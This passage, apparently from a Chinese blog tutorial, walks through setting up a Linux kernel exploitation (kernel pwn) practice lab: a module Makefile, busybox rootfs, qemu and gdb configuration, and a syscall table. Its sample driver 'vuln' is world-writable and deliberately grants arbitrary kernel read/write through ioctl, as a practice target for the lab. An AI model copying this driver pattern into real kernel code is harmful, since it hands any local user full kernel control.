<h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>  在编写kernel pwn的exploit时，有时需要某个结构体的字段偏移。<br>  往往有两种方式</p>
<ol>
<li>根据源码手算结构体的偏移。这种方式虽然简单，但是十分容易出错</li>
<li>编写一个模块，其内容就是计算结构体偏移</li>
</ol>
<p>对于第二种方式，(默认要计算的结构体在内核不同版本间无变化，否则要先编译对应版本的内核)这里给出编写驱动所需要的<strong>Makefile</strong>、<strong>编译脚本</strong>和<strong>驱动源代码</strong>，可以参照<a target="_blank" rel="noopener" href="https://docs.kernel.org/kbuild/makefiles.html#loadable-module-goals-obj-m">官方参考链接1</a>和<a target="_blank" rel="noopener" href="https://docs.kernel.org/kbuild/modules.html">官方参考链接2</a></p>
<p><strong>Makefile</strong>如下所示<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m	+= hawk.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure></p>
<p>  在<strong>Makefile</strong>同目录下执行如下命令<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make		<span class="comment">#编译驱动</span></span><br><span class="line">make clean	<span class="comment">#清除编译</span></span><br></pre></td></tr></table></figure></p>
<p>  <strong>驱动源代码</strong>样例如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/random.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_WRITE		0x1737</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_READ		0x1738</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_unlocked_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">vuln_fops</span> =</span> &#123;</span><br><span class="line">	open : vuln_open,</span><br><span class="line">	unlocked_ioctl : vuln_unlocked_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">vuln_miscdev</span> =</span> &#123;</span><br><span class="line">    .minor      = <span class="number">11</span>,</span><br><span class="line">    .name       = <span class="string">&quot;vuln&quot;</span>,</span><br><span class="line">    .fops       = &amp;vuln_fops,</span><br><span class="line">    .mode	    = <span class="number">0666</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> *addr;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> val;</span><br><span class="line">&#125; Data;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_unlocked_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line"></span><br><span class="line">	Data data;</span><br><span class="line">	<span class="built_in">memset</span>(&amp;data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> VULN_WRITE:</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(copy_from_user(&amp;data, (Data *)arg, <span class="keyword">sizeof</span>(data)) != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">			*(data.addr) = data.val;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">case</span> VULN_READ:</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(copy_from_user(&amp;data, (Data *)arg, <span class="keyword">sizeof</span>(data)) != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(copy_to_user((<span class="type">void</span>*)data.val, data.addr, <span class="keyword">sizeof</span>(data.val)) != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -ENOTTY;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> misc_register(&amp;vuln_miscdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">vuln_exit</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	 misc_deregister(&amp;vuln_miscdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(vuln_init);</span><br><span class="line">module_exit(vuln_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h2><p>前面简单介绍过，<strong>Linux</strong>内核的启动过程，需要根文件系统映像。一般使用<a target="_blank" rel="noopener" href="https://busybox.net/">busybox</a></p>
<p>其中，通过<code>make menuconfig</code>以静态链接方式编译，再通过<code>make</code>和<code>make install</code>命令，即可在<strong>${busybox}/_install</strong>目录中，构建一个基础的根文件系统。</p>
<p>再通过前面相关内容，即可通过<strong>cpio</strong>命令，生成根文件系统映像</p>
<h3 id="创建挂载目录"><a href="#创建挂载目录" class="headerlink" title="创建挂载目录"></a>创建挂载目录</h3><p>执行下述命令，创建内核的伪文件系统的挂载点<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> dev etc proc sys</span><br></pre></td></tr></table></figure></p>
<h3 id="etc-inittab"><a href="#etc-inittab" class="headerlink" title="/etc/inittab"></a>/etc/inittab</h3><p>根据<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/busybox/latest/source/init/init.c">init/init.c</a>可知，<strong>/linuxrc</strong>会解析/etc/inittab文件，并完成相关的脚本执行。模板配置如下所示<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::respawn:-/bin/sh</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure></p>
<h3 id="etc-init-d-rcS"><a href="#etc-init-d-rcS" class="headerlink" title="/etc/init.d/rcS"></a>/etc/init.d/rcS</h3><p>根据上面的<strong>/etc/inittab</strong>脚本的内容，其会执行<strong>/etc/init.d/rcS</strong>脚本，初始化内核配置。模板配置如下所示<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line"><span class="built_in">echo</span> /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line">mdev -s</span><br></pre></td></tr></table></figure></p>
<p>创建该文件后，还需要设置权限为可执行，即执行<code>chmod +x /etc/init.d/rcS</code>即可</p>
<h2 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h2><p>  为了方便调试，一般通过<strong>qemu</strong>模拟运行内核，运行命令如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line"> -kernel <span class="variable">$&#123;linux&#125;</span>/arch/x86_64/boot/bzImage \</span><br><span class="line"> -initrd /path/to/rootfs.cpio \</span><br><span class="line"> -monitor /dev/null \</span><br><span class="line"> -serial mon:stdio \</span><br><span class="line"> -nographic \</span><br><span class="line"> -append <span class="string">&quot;rdinit=/linuxrc console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line"> -enable-kvm \</span><br><span class="line"> -smp cores=1,threads=1 \</span><br><span class="line"> -m 128M \</span><br><span class="line"> -cpu kvm64,+smep \</span><br><span class="line"> -no-reboot -no-shutdown \</span><br><span class="line"> -s -S</span><br></pre></td></tr></table></figure></p>
<p>  相关参数的含义通过<code>man qemu-system</code>查看，如下所示</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-m</td>
<td style="text-align:center">虚拟机的内存大小，后缀为’M’或’G’</td>
</tr>
<tr>
<td style="text-align:center">-kernel</td>
<td style="text-align:center">内核镜像</td>
</tr>
<tr>
<td style="text-align:center">-initrd</td>
<td style="text-align:center">文件系统镜像</td>
</tr>
<tr>
<td style="text-align:center">-monitor</td>
<td style="text-align:center">重定向Qemu控制台，可以查看虚拟机状态</td>
</tr>
<tr>
<td style="text-align:center">-serial mon:dev_string</td>
<td style="text-align:center">当监视器以这种方式多路复用到 <strong>stdio</strong> 时，<code>Ctrl+C</code> 将不再终止 QEMU，而是传递给来宾</td>
</tr>
<tr>
<td style="text-align:center">-append</td>
<td style="text-align:center">kernel的参数，<a target="_blank" rel="noopener" href="https://docs.kernel.org/admin-guide/kernel-parameters.html">参考链接</a><br><strong>root</strong>:根文件系统对应的设备，有默认值 <br><strong>init</strong>:制定内核执行的第一条命令，有默认值 <br><strong>console</strong>:console对应的设备，一般用<strong>ttyS0</strong>，从而重定向到串口</td>
</tr>
<tr>
<td style="text-align:center">-enable-kvm</td>
<td style="text-align:center">开启KVM虚拟化</td>
</tr>
<tr>
<td style="text-align:center">-nographic</td>
<td style="text-align:center">关闭Qemu GUI。可以使用-monitor重定向Qemu控制台;-serial重定向guest串口信息; -display重定向guest的GUI</td>
</tr>
<tr>
<td style="text-align:center">-smp</td>
<td style="text-align:center">设置虚拟机cpu属性</td>
</tr>
<tr>
<td style="text-align:center">-cpu</td>
<td style="text-align:center">设置cpu模型信息</td>
</tr>
<tr>
<td style="text-align:center">-no-reboot</td>
<td style="text-align:center">当内核崩溃后，静止重启</td>
</tr>
<tr>
<td style="text-align:center">-no-shutdown</td>
<td style="text-align:center">当内核崩溃后，冻结在崩溃位置处</td>
</tr>
</tbody>
</table>
</div>
<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><h3 id="qemu启动脚本"><a href="#qemu启动脚本" class="headerlink" title="qemu启动脚本"></a>qemu启动脚本</h3><p>则本地调试脚本如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">apt_search</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        apt list --installed | grep <span class="string">&quot;<span class="variable">$arg</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> [ ! <span class="string">&quot;$?&quot;</span> = <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">return</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根文件系统路径</span></span><br><span class="line">ROOT=$(<span class="built_in">pwd</span>)/rootfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件系统映像路径</span></span><br><span class="line">ROOTFS=$(<span class="built_in">pwd</span>)/rootfs.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内核镜像路径</span></span><br><span class="line">KERNEL=$(<span class="built_in">pwd</span>)/kernel</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp源代码路径</span></span><br><span class="line">EXP=$(<span class="built_in">pwd</span>)/exp.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装所需要的依赖包</span></span><br><span class="line">apt_search libkeyutils-dev musl-tools</span><br><span class="line"><span class="keyword">if</span> [ ! <span class="string">&quot;$?&quot;</span> = <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">sudo</span> apt-get install -y libkeyutils-dev musl-tools</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 静态编译exp</span></span><br><span class="line">gcc -E -Werror -Wall -o $(<span class="built_in">pwd</span>)/rootfs/exp.i <span class="variable">$&#123;EXP&#125;</span> \</span><br><span class="line">    &amp;&amp; musl-gcc -Os -Werror -Wall -static -o $(<span class="built_in">pwd</span>)/rootfs/exp $(<span class="built_in">pwd</span>)/rootfs/exp.i -lpthread \</span><br><span class="line">    &amp;&amp; strip -s $(<span class="built_in">pwd</span>)/rootfs/exp \</span><br><span class="line">    &amp;&amp; <span class="built_in">rm</span> -rf $(<span class="built_in">pwd</span>)/rootfs/exp.i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成文件系统映像</span></span><br><span class="line">(<span class="built_in">cd</span> <span class="variable">$&#123;ROOT&#125;</span>; find . | cpio -o --format=newc &gt; <span class="variable">$&#123;ROOTFS&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动qemu</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -serial mon:stdio \</span><br><span class="line">    -kernel <span class="variable">$&#123;KERNEL&#125;</span>/arch/x86_64/boot/bzImage \</span><br><span class="line">    -append <span class="string">&#x27;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&#x27;</span> \</span><br><span class="line">    -initrd <span class="variable">$&#123;ROOTFS&#125;</span> \</span><br><span class="line">    -no-shutdown -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure></p>
<h3 id="gdb配置文件"><a href="#gdb配置文件" class="headerlink" title="gdb配置文件"></a>gdb配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># .gdbinit</span><br><span class="line">target remote localhost:1234</span><br><span class="line"></span><br><span class="line"># 设置kernel基址</span><br><span class="line">set $kernel_base=0xffffffff81000000</span><br><span class="line">set $driver_base=0xffffffffc0000000</span><br><span class="line"></span><br><span class="line">add-symbol-file kernel/vmlinux $kernel_base</span><br><span class="line">add-symbol-file driver/vuln.ko $driver_base</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><p>参考<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/syscalls/syscall_64.tbl">arch/x86/entry/syscalls/syscall_64.tbl</a>，使用如下命令<code>cat arch/x86/entry/syscalls/syscall_64.tbl | awk &#39;&#123;print $3,$2,$1&#125;&#39; | awk &#39;&#123;if(NF==3)&#123;print $0&#125;&#125;&#39; | awk &#39;&#123;if($2==&quot;common&quot; || $2==&quot;64&quot; || $2==&quot;x32&quot;)&#123;printf &quot;|%-30s|%-6s|%s|\n&quot;,$1,$2,$3&#125;&#125;&#39;</code>，生成64位下的系统调用号</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">系统调用名称</th>
<th style="text-align:center">abi</th>
<th style="text-align:center">系统调用号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">read</td>
<td style="text-align:center">common</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">write</td>
<td style="text-align:center">common</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">open</td>
<td style="text-align:center">common</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">close</td>
<td style="text-align:center">common</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">stat</td>
<td style="text-align:center">common</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">fstat</td>
<td style="text-align:center">common</td>
<td style="text-align:center">5</td>
</tr>
<tr>
<td style="text-align:center">lstat</td>
<td style="text-align:center">common</td>
<td style="text-align:center">6</td>
</tr>
<tr>
<td style="text-align:center">poll</td>
<td style="text-align:center">common</td>
<td style="text-align:center">7</td>
</tr>
<tr>
<td style="text-align:center">lseek</td>
<td style="text-align:center">common</td>
<td style="text-align:center">8</td>
</tr>
<tr>
<td style="text-align:center">mmap</td>
<td style="text-align:center">common</td>
<td style="text-align:center">9</td>
</tr>
<tr>
<td style="text-align:center">mprotect</td>
<td style="text-align:center">common</td>
<td style="text-align:center">10</td>
</tr>
<tr>
<td style="text-align:center">munmap</td>
<td style="text-align:center">common</td>
<td style="text-align:center">11</td>
</tr>
<tr>
<td style="text-align:center">brk</td>
<td style="text-align:center">common</td>
<td style="text-align:center">12</td>
</tr>
<tr>
<td style="text-align:center">rt_sigaction</td>
<td style="text-align:center">64</td>
<td style="text-align:center">13</td>
</tr>
<tr>
<td style="text-align:center">rt_sigprocmask</td>
<td style="text-align:center">common</td>
<td style="text-align:center">14</td>
</tr>
<tr>
<td style="text-align:center">rt_sigreturn</td>
<td style="text-align:center">64</td>
<td style="text-align:center">15</td>
</tr>
<tr>
<td style="text-align:center">ioctl</td>
<td style="text-align:center">64</td>
<td style="text-align:center">16</td>
</tr>
<tr>
<td style="text-align:center">pread64</td>
<td style="text-align:center">common</td>
<td style="text-align:center">17</td>
</tr>
<tr>
<td style="text-align:center">pwrite64</td>
<td style="text-align:center">common</td>
<td style="text-align:center">18</td>
</tr>
<tr>
<td style="text-align:center">readv</td>
<td style="text-align:center">64</td>
<td style="text-align:center">19</td>
</tr>
<tr>
<td style="text-align:center">writev</td>
<td style="text-align:center">64</td>
<td style="text-align:center">20</td>
</tr>
<tr>
<td style="text-align:center">access</td>
<td style="text-align:center">common</td>
<td style="text-align:center">21</td>
</tr>
<tr>
<td style="text-align:center">pipe</td>
<td style="text-align:center">common</td>
<td style="text-align:center">22</td>
</tr>
<tr>
<td style="text-align:center">select</td>
<td style="text-align:center">common</td>
<td style="text-align:center">23</td>
</tr>
<tr>
<td style="text-align:center">sched_yield</td>
<td style="text-align:center">common</td>
<td style="text-align:center">24</td>
</tr>
<tr>
<td style="text-align:center">mremap</td>
<td style="text-align:center">common</td>
<td style="text-align:center">25</td>
</tr>
<tr>
<td style="text-align:center">msync</td>
<td style="text-align:center">common</td>
<td style="text-align:center">26</td>
</tr>
<tr>
<td style="text-align:center">mincore</td>
<td style="text-align:center">common</td>
<td style="text-align:center">27</td>
</tr>
<tr>
<td style="text-align:center">madvise</td>
<td style="text-align:center">common</td>
<td style="text-align:center">28</td>
</tr>
<tr>
<td style="text-align:center">shmget</td>
<td style="text-align:center">common</td>
<td style="text-align:center">29</td>
</tr>
<tr>
<td style="text-align:center">shmat</td>
<td style="text-align:center">common</td>
<td style="text-align:center">30</td>
</tr>
<tr>
<td style="text-align:center">shmctl</td>
<td style="text-align:center">common</td>
<td style="text-align:center">31</td>
</tr>
<tr>
<td style="text-align:center">dup</td>
<td style="text-align:center">common</td>
<td style="text-align:center">32</td>
</tr>
<tr>
<td style="text-align:center">dup2</td>
<td style="text-align:center">common</td>
<td style="text-align:center">33</td>
</tr>
<tr>
<td style="text-align:center">pause</td>
<td style="text-align:center">common</td>
<td style="text-align:center">34</td>
</tr>
<tr>
<td style="text-align:center">nanosleep</td>
<td style="text-align:center">common</td>
<td style="text-align:center">35</td>
</tr>
<tr>
<td style="text-align:center">getitimer</td>
<td style="text-align:center">common</td>
<td style="text-align:center">36</td>
</tr>
<tr>
<td style="text-align:center">alarm</td>
<td style="text-align:center">common</td>
<td style="text-align:center">37</td>
</tr>
<tr>
<td style="text-align:center">setitimer</td>
<td style="text-align:center">common</td>
<td style="text-align:center">38</td>
</tr>
<tr>
<td style="text-align:center">getpid</td>
<td style="text-align:center">common</td>
<td style="text-align:center">39</td>
</tr>
<tr>
<td style="text-align:center">sendfile</td>
<td style="text-align:center">common</td>
<td style="text-align:center">40</td>
</tr>
<tr>
<td style="text-align:center">socket</td>
<td style="text-align:center">common</td>
<td style="text-align:center">41</td>
</tr>
<tr>
<td style="text-align:center">connect</td>
<td style="text-align:center">common</td>
<td style="text-align:center">42</td>
</tr>
<tr>
<td style="text-align:center">accept</td>
<td style="text-align:center">common</td>
<td style="text-align:center">43</td>
</tr>
<tr>
<td style="text-align:center">sendto</td>
<td style="text-align:center">common</td>
<td style="text-align:center">44</td>
</tr>
<tr>
<td style="text-align:center">recvfrom</td>
<td style="text-align:center">64</td>
<td style="text-align:center">45</td>
</tr>
<tr>
<td style="text-align:center">sendmsg</td>
<td style="text-align:center">64</td>
<td style="text-align:center">46</td>
</tr>
<tr>
<td style="text-align:center">recvmsg</td>
<td style="text-align:center">64</td>
<td style="text-align:center">47</td>
</tr>
<tr>
<td style="text-align:center">shutdown</td>
<td style="text-align:center">common</td>
<td style="text-align:center">48</td>
</tr>
<tr>
<td style="text-align:center">bind</td>
<td style="text-align:center">common</td>
<td style="text-align:center">49</td>
</tr>
<tr>
<td style="text-align:center">listen</td>
<td style="text-align:center">common</td>
<td style="text-align:center">50</td>
</tr>
<tr>
<td style="text-align:center">getsockname</td>
<td style="text-align:center">common</td>
<td style="text-align:center">51</td>
</tr>
<tr>
<td style="text-align:center">getpeername</td>
<td style="text-align:center">common</td>
<td style="text-align:center">52</td>
</tr>
<tr>
<td style="text-align:center">socketpair</td>
<td style="text-align:center">common</td>
<td style="text-align:center">53</td>
</tr>
<tr>
<td style="text-align:center">setsockopt</td>
<td style="text-align:center">64</td>
<td style="text-align:center">54</td>
</tr>
<tr>
<td style="text-align:center">getsockopt</td>
<td style="text-align:center">64</td>
<td style="text-align:center">55</td>
</tr>
<tr>
<td style="text-align:center">clone</td>
<td style="text-align:center">common</td>
<td style="text-align:center">56</td>
</tr>
<tr>
<td style="text-align:center">fork</td>
<td style="text-align:center">common</td>
<td style="text-align:center">57</td>
</tr>
<tr>
<td style="text-align:center">vfork</td>
<td style="text-align:center">common</td>
<td style="text-align:center">58</td>
</tr>
<tr>
<td style="text-align:center">execve</td>
<td style="text-align:center">64</td>
<td style="text-align:center">59</td>
</tr>
<tr>
<td style="text-align:center">exit</td>
<td style="text-align:center">common</td>
<td style="text-align:center">60</td>
</tr>
<tr>
<td style="text-align:center">wait4</td>
<td style="text-align:center">common</td>
<td style="text-align:center">61</td>
</tr>
<tr>
<td style="text-align:center">kill</td>
<td style="text-align:center">common</td>
<td style="text-align:center">62</td>
</tr>
<tr>
<td style="text-align:center">uname</td>
<td style="text-align:center">common</td>
<td style="text-align:center">63</td>
</tr>
<tr>
<td style="text-align:center">semget</td>
<td style="text-align:center">common</td>
<td style="text-align:center">64</td>
</tr>
<tr>
<td style="text-align:center">semop</td>
<td style="text-align:center">common</td>
<td style="text-align:center">65</td>
</tr>
<tr>
<td style="text-align:center">semctl</td>
<td style="text-align:center">common</td>
<td style="text-align:center">66</td>
</tr>
<tr>
<td style="text-align:center">shmdt</td>
<td style="text-align:center">common</td>
